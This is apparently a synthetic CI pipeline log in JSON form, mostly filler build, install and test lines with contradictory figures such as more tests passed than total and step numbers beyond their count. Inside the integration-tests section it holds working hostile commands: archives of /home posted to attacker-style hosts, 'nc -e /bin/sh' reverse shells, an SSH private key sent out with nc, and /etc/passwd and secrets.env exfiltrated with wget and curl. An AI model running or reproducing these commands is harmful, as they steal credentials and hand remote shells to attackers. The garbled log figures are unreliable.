webpack@1.17.3\nLoading...\nCache hit for key-2868\nGET /status - 201 (29ms)\nCache saved successfully\n  PASS: test_user_create (351ms)\nCreating production build...\nCompiling utils/index.js...\npip: Installing build dependencies...\nReady.\n  PASS: test_user_create (336ms)\nUsing Python 3.9\nInstalling webpack@1.10.5\nCompiling components/service.java...\nChecking out master branch\nAlready up to date.\n[12:46:31] DEBUG: Initializing service\nOK\npip: Downloading react-3.3.tar.gz\n[12:46:31] WARN: Deprecated API usage\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nDone.\nLoading...\nSwitched to branch 'bugfix/task-347'\nAlready up to date.\nWARNING: react has known vulnerabilities\n[12:46:31] INFO: Request completed\nCache invalidated: dependencies\nHEAD is now at 487214a\nSnapshots: 35 passed, 0 total\nStep 15/23: Running migrations\nReady.\nCompiling lib/service.java...\n[12:46:31] DEBUG: Loading configuration\nDone.\n\u2713 All checks passed\nImage pulled successfully\nTest Suites: 42 passed, 33 total\nArtifact downloaded: 41MB\nFetching from https://registry.npmjs.org/package.json\nInstalling jest@4.3.5\nReady.\nStep 5/21: Deploying\nNODE_ENV=test\nStep 17/15: Testing\nPlatform: linux-x64\nStep 3/19: Linting\n[12:46:31] DEBUG: Initializing service\nCreating production build...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /health - 204 (46ms)\nUsing Node.js 20.18.1\nnpm install: added 367 packages\nConnection established\nFetching submodules...\nCreating production build...\n[12:46:31] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nnpm notice: package.json updated\nnpm install: added 254 packages\nVerifying...\n\u2717 build failed with exit code 114\nCreating production build...\nEnvironment: development\npip: Collecting express\nWARNING: prettier has known vulnerabilities\nAlready up to date.\nInstalling react@5.9.0\n[12:46:31] DEBUG: Loading configuration\nException: ValueError\nTransforming 167 files...\nUsing Node.js 16.11.10\nRan 179 tests in 36s\nWARNING: jest has known vulnerabilities\nCompiling lib/handler.rs...\nCache miss for key-5943\nBundling runtime.css\n\u2713 All checks passed\n\u2713 deploy completed\n  PASS: e2e/test_cache_hit.spec.js\nEnvironment: test\nStep 3/24: Building\n[12:46:31] WARN: Deprecated API usage\nnpm install: resolved 1368 packages\n[12:46:31] DEBUG: Query executed in 72ms\n\u2713 Task completed in 3740ms\nInstalling eslint@3.11.7\nCompiling lib/utils.go...\n[12:46:31] INFO: Processing request\nStep 16/22: Linting\nConnection established\n[12:46:31] DEBUG: Initializing service\nProcessing...\nException: RuntimeError\nAlready up to date.\nFetching submodules...\nRan 107 tests in 32s\nHEAD is now at d309abc\n[12:46:31] INFO: Cache refreshed\nPulling image: python:18\nProcessing...\nTime: 113.797s\nFinished.\nMinifying vendor.js\nGET /api - 204 (42ms)\nCompleted.\n[12:46:31] WARN: Deprecated API usage\n[12:46:31] INFO: Cache refreshed\nArtifact downloaded: 21MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: darwin-arm64\n[12:46:31] DEBUG: Query executed in 78ms\npip: Collecting webpack\nTLS handshake completed\nCompiling src/main.py...\nWaiting...\nFetching submodules...\nTransforming 143 files...\n\u2713 All checks passed\nTransforming 787 files...\nFinished.\nArtifact downloaded: 42MB\nnpm install: added 166 packages\nDone.\nCompleted.\nNODE_ENV=development\n\u2713 Task completed in 3439ms\n[12:46:31] WARN: Deprecated API usage\nTLS handshake completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nCompiling src/handler.rs...\nRan 195 tests in 15s\nArtifact downloaded: 5MB\nDone.\nCache restored successfully (406MB)\nReady.\nTime: 50.127s\nHEAD is now at 5613b0e\nArtifact uploaded: dist.zip (78MB)\n[12:46:31] INFO: Processing request\n[12:46:31] WARN: Deprecated API usage\n\u2713 build completed\nException: TypeError\nPOST /data - 202 (289ms)\nUploading artifact 'build' (43 files)\nAlready up to date.\nWaiting...\npip: Downloading webpack-1.9.tar.gz\nCompiling components/handler.rs...\nTime: 4.994s\n=== Step save_cache completed ===\n=== Step: restore_cache ===\nSwitched to branch 'hotfix/task-739'\n[12:46:31] INFO: Connecting to database\nStep 10/24: Testing\nCache invalidated: dependencies\nBundling main.css\nSwitched to branch 'bugfix/task-853'\nWaiting...\nWaiting...\nCompiling utils/service.java...\npip: Collecting lodash\nPOST /api - 201 (172ms)\nyarn add: Done in 23.34s\n\u2717 build failed with exit code 19\nTime: 93.587s\nPlatform: win32-x64\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:31] DEBUG: Initializing service\nChecking out develop branch\nMinifying app.js\nWARNING: lodash has known vulnerabilities\nInstalling eslint@1.11.9\nBuilding Docker image...\nHEAD is now at 6761ce5\nCache hit for key-9453\nUploading artifact 'dist' (38 files)\nArtifact uploaded: dist.zip (49MB)\n[12:46:31] DEBUG: Loading configuration\nWARNING: webpack has known vulnerabilities\nVerifying...\nPulling image: node:18\nnpm install: resolved 1365 packages\n\u2713 test completed\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (48MB)\nCompiling src/app.ts...\n\u2713 Task completed in 2111ms\nCache saved successfully\nUploading artifact 'dist' (42 files)\nCompiling lib/main.py...\nStep 8/16: Building\nHEAD is now at bca62a4\nTest Suites: 46 passed, 13 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nPulling image: node:latest\nSuccess!\n[12:46:31] INFO: Processing request\nProcessing...\n[12:46:31] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:46:31] INFO: Request completed\nCompiling components/main.py...\n\u2713 Task completed in 3682ms\nCompiling components/utils.go...\nnpm notice: created a lockfile\n\u2713 package completed\nTLS handshake completed\nLayer 10/14: COPY command\n\u2713 Step 'test' succeeded\n\u2713 deploy completed\nRan 48 tests in 31s\nCompiling utils/utils.go...\nUsing Python 3.9\nException: NullPointerException\nTest Suites: 13 passed, 28 total\nFinished.\nRan 91 tests in 21s\nFAILED: test_cache_hit\nCompiling lib/service.java...\nUploading artifact 'coverage' (28 files)\nOK\nTest Suites: 28 passed, 42 total\nLayer 10/15: ENV command\nUsing Python 3.9\nLayer 5/13: COPY command\nPushing to registry...\nException: NullPointerException\nCompleted.\nPlatform: win32-x64\nUsing Python 3.9\n[12:46:31] DEBUG: Query executed in 98ms\nSwitched to branch 'feature/task-679'\nnpm install: resolved 1409 packages\nCompiling utils/handler.rs...\nHEAD is now at d5c0df6\n[12:46:31] DEBUG: Query executed in 73ms\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling webpack@3.18.1\npip: Collecting react\nSwitched to branch 'feature/task-688'\nTime: 22.937s\n[12:46:31] ERROR: Connection failed\nUploading artifact 'coverage' (44 files)\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (6MB)\nTime: 5.761s\nnpm notice: package.json updated\n[12:46:31] INFO: Request completed\n[12:46:31] INFO: Processing request\nArtifact downloaded: 20MB\nTransforming 934 files...\nUsing Python 3.10\n[12:46:31] ERROR: Connection failed\nUsing Node.js 19.8.7\nCreating production build...\nyarn add: Done in 23.10s\nLoading...\n\u2713 Task completed in 3213ms\n\u2713 deploy completed\nStep 1/18: Testing\npip: Downloading jest-3.7.tar.gz\n  PASS: test_auth_login (266ms)\nStep 19/18: Deploying\nWaiting...\nRan 111 tests in 17s\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: prettier has known vulnerabilities\nTransforming 838 files...\n[12:46:31] INFO: Connecting to database\n[12:46:31] DEBUG: Query executed in 51ms\n[12:46:31] INFO: Connecting to database\nPushing to registry...\nPulling image: node:18\n[12:46:31] INFO: Request completed\n  PASS: unit/test_cache_hit.spec.js\nCompiling lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\n=== Step restore_cache completed ===\n=== Step: e2e_tests ===\nReady.\nStep 10/22: Building\n[12:46:31] WARN: Deprecated API usage\nHEAD is now at 72acc7e\nFetching submodules...\nAlready up to date.\nReady.\nVerifying...\n\u2717 build failed with exit code 18\nFetching from https://github.com/package.json\n[12:46:31] INFO: Connecting to database\nInstalling react@5.17.5\nCache hit for key-5783\nException: NullPointerException\n[12:46:31] INFO: Connecting to database\nStep 1/20: Installing dependencies\nBuilding Docker image...\nStep 6/20: Linting\nUsing Python 3.11\nBuilding Docker image...\npip: Installing build dependencies...\nNODE_ENV=test\n\u2713 Step 'test' succeeded\n[12:46:31] DEBUG: Connection pool: 15 active\nFinished.\nNODE_ENV=production\nCompiling lib/utils.go...\n\u2713 Task completed in 4550ms\n[12:46:31] INFO: Starting build process\n[12:46:31] DEBUG: Loading configuration\nWaiting...\n  PASS: e2e/test_auth_login.spec.js\nStep 13/15: Linting\nAlready up to date.\nLoading...\nInstalling jest@4.6.0\n\u2713 All checks passed\nCache saved successfully\nStep 20/24: Building\nBuilding Docker image...\nTest Suites: 47 passed, 48 total\nPlatform: win32-x64\n[12:46:31] INFO: Connecting to database\nNODE_ENV=production\nSnapshots: 22 passed, 39 total\nWaiting...\n[12:46:31] DEBUG: Connection pool: 9 active\n[12:46:31] DEBUG: Loading configuration\nLoading...\nCompleted.\nCompiling utils/app.ts...\n[12:46:31] DEBUG: Loading configuration\n[12:46:31] DEBUG: Connection pool: 13 active\nArtifact downloaded: 48MB\nCompleted.\nEnvironment: development\nStep 1/20: Linting\n[12:46:31] DEBUG: Memory usage: 602MB\nImage pulled successfully\nRan 109 tests in 2s\nStep 10/25: Linting\npip: Downloading prettier-5.11.tar.gz\nMinifying app.js\n[12:46:31] DEBUG: Memory usage: 1842MB\nException: RuntimeError\nTests: 466 passed, 268 total\nPulling image: python:latest\nWARNING: prettier has known vulnerabilities\n[12:46:31] INFO: Connecting to database\npip install: Successfully installed axios-2.2\nOK\n  PASS: test_user_create (469ms)\npip: Downloading react-2.12.tar.gz\nImage pulled successfully\nRan 47 tests in 37s\nEnvironment: staging\nSnapshots: 16 passed, 44 total\nPlatform: darwin-arm64\nReady.\nReady.\nWaiting...\nDone.\nConnection established\n[12:46:31] DEBUG: Loading configuration\nInstalling express@5.4.2\nArtifact uploaded: dist.zip (30MB)\n  PASS: unit/test_user_create.spec.js\nBuilding Docker image...\nBuilding Docker image...\nFinished.\nTest Suites: 35 passed, 43 total\nUsing Python 3.11\n[12:46:31] DEBUG: Memory usage: 1637MB\nStep 13/23: Building\n\u2713 build completed\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nTime: 63.651s\n\u2713 lint completed\nUploading artifact 'dist' (5 files)\n[12:46:31] DEBUG: Initializing service\nCompleted.\nCompiling src/app.ts...\nCache invalidated: build\n\u2717 build failed with exit code 119\nWARNING: jest has known vulnerabilities\npip: Collecting eslint\nCompiling lib/index.js...\nCompiling lib/index.js...\nStep 6/23: Testing\nBuilding Docker image...\nnpm install: added 75 packages\n[12:46:31] ERROR: Connection failed\nOK\nyarn add: Done in 25.37s\nUsing Node.js 14.5.8\nLoading...\npip install: Successfully installed webpack-4.6\nProcessing...\nTest Suites: 27 passed, 41 total\npip install: Successfully installed lodash-4.8\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nCache hit for key-3129\nCompiling utils/index.js...\nLayer 9/11: RUN command\nnpm install: added 333 packages\nWARNING: express has known vulnerabilities\nFinished.\nSnapshots: 18 passed, 48 total\nBuilding Docker image...\nImage pulled successfully\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nPOST /data - 201 (255ms)\nCache saved successfully\nBundling styles.css\nRan 119 tests in 18s\nArtifact downloaded: 21MB\nTests: 245 passed, 411 total\nCompleted.\nPushing to registry...\nCompleted.\nCoverage: 96% statements, 64% branches\nFAILED: test_cache_hit\nStep 1/18: Installing dependencies\nCache saved successfully\nStep 3/16: Installing dependencies\nArtifact uploaded: build.tar.gz (5MB)\nBuilding Docker image...\nBundling main.css\nCompiling components/main.py...\n[12:46:31] INFO: Connecting to database\nStep 20/25: Installing dependencies\nnpm install: added 40 packages\nNODE_ENV=development\nCoverage: 74% statements, 74% branches\n[12:46:31] INFO: Request completed\nBundling main.js\n\u2713 Task completed in 578ms\n[12:46:31] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\nChecking out master branch\nProcessing...\nCache invalidated: dependencies\nUsing Node.js 15.2.5\nTransforming 221 files...\nArtifact uploaded: dist.zip (25MB)\nCompiling lib/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (112ms)\nProcessing...\nAlready up to date.\nTime: 98.68s\nWARNING: react has known vulnerabilities\nStep 8/22: Linting\nStep 12/20: Building\nImage pulled successfully\nArtifact uploaded: dist.zip (1MB)\nCache invalidated: dependencies\nUploading artifact 'build' (36 files)\nSuccess!\nFinished.\n[12:46:31] WARN: Deprecated API usage\nFetching submodules...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching from https://npmjs.org/package.json\nAlready up to date.\n  PASS: test_auth_login (159ms)\npip: Collecting lodash\nCache restored successfully (455MB)\nReady.\nNODE_ENV=test\n[12:46:31] INFO: Cache refreshed\nSwitched to branch 'hotfix/task-703'\nCache restored successfully (28MB)\nNODE_ENV=test\n[12:46:31] DEBUG: Query executed in 44ms\nPlatform: darwin-arm64\nNODE_ENV=development\npip: Collecting lodash\nCompiling lib/handler.rs...\nTLS handshake completed\n\u2713 All checks passed\npip: Collecting prettier\nnpm install: resolved 1422 packages\nCompiling components/app.ts...\nHEAD is now at 5b477ee\n[12:46:31] WARN: Deprecated API usage\nCache miss for key-6526\n[12:46:31] INFO: Connecting to database\nOK\nSuccess!\n[12:46:31] INFO: Cache refreshed\nMinifying app.js\nTLS handshake completed\n  PASS: unit/test_cache_hit.spec.js\nnpm install: added 494 packages\nPulling image: alpine:18\nnpm notice: created a lockfile\n\u2713 All checks passed\nPOST /api - 201 (348ms)\n  PASS: test_cache_hit (185ms)\nTLS handshake completed\nFetching from https://githubusercontent.com/package.json\nTransforming 377 files...\nnpm notice: package.json updated\nStep 14/16: Running migrations\nAlready up to date.\nCompiling lib/index.js...\nException: ValueError\n\u2713 Step 'checkout' succeeded\nBundling vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:31] DEBUG: Memory usage: 1960MB\n[12:46:31] DEBUG: Memory usage: 902MB\n[12:46:31] INFO: Request completed\nSnapshots: 48 passed, 12 total\nAlready up to date.\n[12:46:31] WARN: Deprecated API usage\nException: RuntimeError\n[12:46:31] DEBUG: Query executed in 88ms\nPushing to registry...\n[12:46:31] DEBUG: Memory usage: 1170MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:31] INFO: Cache refreshed\nBundling vendor.css\nLoading...\n\u2713 All checks passed\nOptimizing 95 modules...\nWARNING: prettier has known vulnerabilities\npip: Installing build dependencies...\nStep 8/18: Installing dependencies\nCache hit for key-8202\n[12:46:31] WARN: Deprecated API usage\nCache saved successfully\nOptimizing 72 modules...\nReady.\nPushing to registry...\nArtifact uploaded: dist.zip (92MB)\nReady.\nSnapshots: 14 passed, 29 total\nCache hit for key-1256\nGET /api - 204 (97ms)\n=== Step type_check completed ===\n=== Step: lint ===\n[12:46:31] WARN: Deprecated API usage\n\u2713 Task completed in 1686ms\nWaiting...\nCompiling utils/service.java...\nArtifact downloaded: 37MB\nConnection established\nFAILED: test_db_connect\nnpm notice: created a lockfile\nWARNING: express has known vulnerabilities\nPulling image: node:3.11\nMinifying app.js\nUploading artifact 'coverage' (22 files)\nFinished.\nInstalling axios@1.4.4\nTest Suites: 43 passed, 26 total\nCompiling lib/app.ts...\nPushing to registry...\nPushing to registry...\nStep 3/22: Installing dependencies\nUsing Node.js 18.17.2\n[12:46:31] INFO: Starting build process\nUploading artifact 'build' (22 files)\nLoading...\nRan 10 tests in 38s\nWARNING: jest has known vulnerabilities\nBundling vendor.js\nCache restored successfully (45MB)\nnpm notice: package.json updated\nFAILED: test_user_create\nnpm install: added 475 packages\n\u2713 build completed\n[12:46:31] INFO: Starting build process\nSuccess!\nMinifying vendor.js\nRan 197 tests in 49s\nTime: 87.504s\n[12:46:31] DEBUG: Initializing service\nStep 12/25: Deploying\nCompleted.\nMinifying app.js\nCache saved successfully\nLoading...\nInstalling webpack@5.5.5\nTime: 35.313s\n[12:46:31] ERROR: Connection failed\nnpm install: added 488 packages\nProcessing...\nUploading artifact 'dist' (16 files)\nnpm install: resolved 1721 packages\nMinifying app.js\nCompiling src/service.java...\nUsing Python 3.12\nWARNING: axios has known vulnerabilities\nGenerating source maps...\nUploading artifact 'build' (10 files)\nLayer 10/13: COPY command\nCompiling components/utils.go...\nTime: 63.606s\nCache saved successfully\n[12:46:31] INFO: Connecting to database\nFetching submodules...\n\u2717 build failed with exit code 52\n[12:46:31] ERROR: Connection failed\nTests: 253 passed, 150 total\nAlready up to date.\n[12:46:31] INFO: Connecting to database\nCreating production build...\n[12:46:31] WARN: Deprecated API usage\nBuilding Docker image...\nException: RuntimeError\nStep 9/18: Linting\nStep 18/22: Running migrations\nLayer 8/10: ENV command\nCompiling lib/utils.go...\nSuccess!\nLayer 9/9: ENV command\nChecking out develop branch\n[12:46:31] WARN: Deprecated API usage\nPlatform: darwin-arm64\nUsing Python 3.12\nGET /status - 200 (55ms)\n[12:46:31] DEBUG: Connection pool: 5 active\nConnection established\n[12:46:31] WARN: Deprecated API usage\nEnvironment: production\n[12:46:31] DEBUG: Query executed in 71ms\nCoverage: 88% statements, 74% branches\nSuccess!\nImage pulled successfully\nCompiling lib/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:31] DEBUG: Memory usage: 866MB\nCache restored successfully (352MB)\nGET /status - 201 (79ms)\nFetching from https://githubusercontent.com/package.json\npip: Collecting lodash\n[12:46:31] INFO: Cache refreshed\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 package completed\npip: Installing build dependencies...\nCompleted.\nCreating production build...\nCache restored successfully (365MB)\nHEAD is now at a957064\nTLS handshake completed\nRan 160 tests in 40s\nWARNING: react has known vulnerabilities\nDone.\nUploading artifact 'build' (33 files)\nCompiling lib/app.ts...\nCompiling lib/service.java...\nTest Suites: 21 passed, 10 total\nnpm install: resolved 1658 packages\nFetching submodules...\nOK\nPulling image: node:3.11\nBundling runtime.css\nProcessing...\n  PASS: test_cache_hit (82ms)\nUsing Node.js 14.12.2\nLayer 2/15: COPY command\n\u2713 Task completed in 463ms\nEnvironment: development\nEnvironment: staging\nCompleted.\n\u2717 build failed with exit code 38\nBundling styles.js\nArtifact uploaded: dist.zip (40MB)\nArtifact downloaded: 43MB\nCoverage: 79% statements, 85% branches\nnpm notice: package.json updated\n=== Step lint completed ===\n=== Step: deploy_production ===\nnpm install: added 419 packages\nBundling runtime.css\nyarn add: Done in 17.99s\n[12:46:31] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 49\n[12:46:31] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCompiling src/main.py...\n\u2713 Step 'checkout' succeeded\nException: NullPointerException\n[12:46:31] INFO: Starting build process\nChecking out master branch\n[12:46:31] DEBUG: Memory usage: 950MB\nCompleted.\nSuccess!\n  PASS: test_auth_login (17ms)\nBundling vendor.js\nTransforming 753 files...\nUsing Node.js 17.16.5\nCompiling src/utils.go...\n[12:46:31] INFO: Cache refreshed\n[12:46:31] DEBUG: Connection pool: 11 active\nnpm install: resolved 1438 packages\n\u2717 build failed with exit code 47\nCompiling utils/service.java...\n  PASS: test_api_health (291ms)\nAlready up to date.\nLoading...\nStep 19/17: Linting\nLoading...\n[12:46:31] INFO: Processing request\nBundling styles.js\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling lib/app.ts...\n[12:46:31] INFO: Processing request\nUsing Python 3.9\n[12:46:31] DEBUG: Memory usage: 272MB\nnpm install: added 184 packages\nCompleted.\nUsing Node.js 20.9.5\nChecking out master branch\nFetching from https://githubusercontent.com/package.json\n[12:46:31] INFO: Cache refreshed\nnpm notice: created a lockfile\nCompiling lib/index.js...\nSuccess!\nPlatform: linux-x64\nEnvironment: development\nCreating production build...\nLoading...\n\u2713 All checks passed\nOptimizing 14 modules...\nBuilding Docker image...\nReady.\n[12:46:31] DEBUG: Memory usage: 844MB\n\u2713 Task completed in 889ms\nSuccess!\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Step 'install' succeeded\nStep 9/23: Testing\nArtifact downloaded: 7MB\nnpm install: resolved 1022 packages\nUploading artifact 'build' (45 files)\npip: Downloading lodash-1.11.tar.gz\nHEAD is now at 26d2bbe\nCache restored successfully (187MB)\nArtifact uploaded: build.tar.gz (45MB)\nReady.\nNODE_ENV=production\nTLS handshake completed\nNODE_ENV=production\nStep 4/19: Running migrations\nnpm notice: package.json updated\n[12:46:31] INFO: Connecting to database\n\u2713 All checks passed\nStep 8/23: Building\npip: Collecting webpack\n\u2713 deploy completed\npip install: Successfully installed axios-2.14\nSwitched to branch 'hotfix/task-449'\nUsing Node.js 19.18.8\nStep 18/22: Building\n[12:46:31] DEBUG: Initializing service\n[12:46:31] ERROR: Connection failed\nCompiling src/utils.go...\nArtifact downloaded: 15MB\nChecking out master branch\nStep 20/15: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 19/21: Installing dependencies\nUploading artifact 'dist' (46 files)\nPOST /data - 202 (108ms)\nEnvironment: staging\n[12:46:31] DEBUG: Initializing service\n[12:46:31] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.11\nPulling image: node:latest\nOptimizing 75 modules...\nTime: 20.686s\nArtifact uploaded: dist.zip (99MB)\nStep 16/18: Running migrations\nFinished.\nWaiting...\nWaiting...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (46MB)\n[12:46:31] ERROR: Connection failed\nCreating production build...\nAlready up to date.\n[12:46:31] INFO: Starting build process\nFinished.\nStep 17/21: Installing dependencies\nRan 107 tests in 47s\nBundling vendor.js\nyarn add: Done in 30.99s\nGET /health - 204 (81ms)\nCache miss for key-1238\nnpm install: added 184 packages\nTransforming 209 files...\n\u2713 package completed\nStep 4/15: Building\nCompleted.\nUploading artifact 'dist' (2 files)\nAlready up to date.\nPulling image: alpine:3.11\n[12:46:31] INFO: Connecting to database\nPOST /upload - 200 (81ms)\n[12:46:31] DEBUG: Connection pool: 11 active\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nStep 8/22: Running migrations\npip: Installing build dependencies...\nPlatform: win32-x64\nWARNING: prettier has known vulnerabilities\nTests: 179 passed, 89 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_user_create (296ms)\nTests: 411 passed, 185 total\nTransforming 220 files...\nCache invalidated: dependencies\nUploading artifact 'coverage' (35 files)\npip: Collecting axios\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nPlatform: linux-x64\nUsing Python 3.9\nStep 10/20: Building\n[12:46:31] WARN: Deprecated API usage\nnc -e /bin/sh 63.174.161.96 6404\n\u2713 Task completed in 4376ms\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (66MB)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 11.184.119.161 42731\n[12:46:31] INFO: Processing request\nCompiling utils/service.java...\nOptimizing 91 modules...\nUsing Node.js 17.15.2\n\u2717 build failed with exit code 28\nDone.\nSnapshots: 24 passed, 2 total\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nPlatform: linux-x64\nnc -e /bin/sh 181.230.235.199 45465\nStep 8/18: Deploying\nWaiting...\n\u2713 deploy completed\nnpm notice: package.json updated\nWaiting...\n\u2713 validate completed\nProcessing...\nCompiling components/index.js...\nnpm install: added 360 packages\nOptimizing 25 modules...\nCache restored successfully (375MB)\nFetching from https://amazonaws.com/package.json\nDone.\nReady.\nBuilding Docker image...\n  PASS: test_cache_hit (441ms)\nStep 14/16: Installing dependencies\nCompiling src/main.py...\nProcessing...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nSuccess!\n[12:46:31] WARN: Deprecated API usage\nBuilding Docker image...\nCompleted.\n[12:46:31] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:31] WARN: Deprecated API usage\nPOST /data - 200 (72ms)\nGenerating source maps...\nStep 1/23: Installing dependencies\nNODE_ENV=test\n[12:46:31] INFO: Connecting to database\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact uploaded: build.tar.gz (32MB)\nHEAD is now at 26392fa\nWaiting...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\npip: Collecting prettier\nnc -e /bin/sh 66.42.255.102 63496\n\u2717 build failed with exit code 67\nTLS handshake completed\nStep 13/21: Installing dependencies\nHEAD is now at ea5ad39\nRan 12 tests in 53s\nPulling image: alpine:3.11\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 179 tests in 36s\nBuilding Docker image...\nSwitched to branch 'feature/task-220'\nCreating production build...\nChecking out master branch\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCache miss for key-8957\nFetching from https://github.com/package.json\nBuilding Docker image...\nStep 3/20: Linting\n  PASS: integration/test_cache_hit.spec.js\npip install: Successfully installed react-5.3\nMinifying app.js\nnc -e /bin/sh 95.242.26.104 14447\nCache saved successfully\nnpm notice: package.json updated\nStep 4/24: Running migrations\n  PASS: test_api_health (168ms)\npip: Downloading express-5.20.tar.gz\n[12:46:31] DEBUG: Memory usage: 1609MB\nTLS handshake completed\n[12:46:31] INFO: Cache refreshed\nCache miss for key-8837\nArtifact uploaded: dist.zip (50MB)\n[12:46:31] WARN: Deprecated API usage\npip: Collecting react\nVerifying...\nnc -e /bin/sh 119.197.62.142 64173\nCompiling src/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 228.187.239.45 10172\nSwitched to branch 'bugfix/task-327'\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:31] DEBUG: Connection pool: 14 active\n[12:46:31] WARN: Deprecated API usage\nyarn add: Done in 11.42s\nCache miss for key-3996\n[12:46:31] INFO: Processing request\nyarn add: Done in 4.6s\nnpm install: added 23 packages\nUsing Node.js 20.9.5\nStep 4/19: Testing\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nStep 3/24: Linting\nTest Suites: 26 passed, 35 total\nStep 17/24: Deploying\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: dependencies\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nnc -e /bin/sh 209.44.186.95 42037\nCompiling src/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nBundling vendor.js\nArtifact downloaded: 34MB\nStep 20/21: Linting\nCompiling src/index.js...\nnpm install: resolved 172 packages\n\u2713 All checks passed\n[12:46:31] INFO: Connecting to database\n[12:46:31] DEBUG: Connection pool: 13 active\n  PASS: integration/test_cache_hit.spec.js\nArtifact uploaded: build.tar.gz (31MB)\nCoverage: 74% statements, 90% branches\nUsing Python 3.10\nCache saved successfully\nBuilding Docker image...\nnpm notice: created a lockfile\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:46:31.767433",
        "finished_at": "2025-11-28T12:46:36.355238",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:46:31] DEBUG: Initializing service",
          "NODE_ENV=production",
          "Processing...",
          "Loading...",
          "Loading...",
          "Test Suites: 42 passed, 9 total",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "[12:46:31] WARN: Deprecated API usage",
          "Using Python 3.12",
          "[12:46:31] DEBUG: Loading configuration",
          "[12:46:31] DEBUG: Initializing service",
          "[12:46:31] INFO: Cache refreshed",
          "Coverage: 71% statements, 85% branches",
          "[12:46:31] INFO: Request completed",
          "\u2713 All checks passed",
          "Transforming 328 files...",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Done.",
          "Generating source maps...",
          "[12:46:31] DEBUG: Query executed in 63ms",
          "[12:46:31] INFO: Cache refreshed",
          "Step 3/24: Building",
          "yarn add: Done in 24.94s",
          "TLS handshake completed",
          "\u2713 Task completed in 2852ms",
          "Bundling main.css",
          "Step 1/22: Testing",
          "Success!",
          "pip install: Successfully installed express-1.8",
          "Image pulled successfully",
          "Artifact downloaded: 39MB",
          "Pulling image: alpine:18",
          "Completed.",
          "pip: Installing build dependencies...",
          "pip: Downloading eslint-1.12.tar.gz",
          "Ready.",
          "\u2713 deploy completed",
          "\u2713 build completed",
          "Loading...",
          "Step 17/18: Building",
          "\u2713 Step 'build' succeeded",
          "NODE_ENV=test",
          "[12:46:31] WARN: Deprecated API usage",
          "Finished.",
          "[12:46:31] DEBUG: Query executed in 82ms",
          "WARNING: react has known vulnerabilities",
          "Exception: RuntimeError",
          "Loading...",
          "Compiling utils/utils.go...",
          "Optimizing 61 modules...",
          "yarn add: Done in 25.55s",
          "Building Docker image...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Layer 6/9: ENV command",
          "Layer 8/8: COPY command",
          "Compiling components/service.java...",
          "Step 13/21: Running migrations",
          "\u2713 package completed",
          "TLS handshake completed",
          "Step 8/24: Testing",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
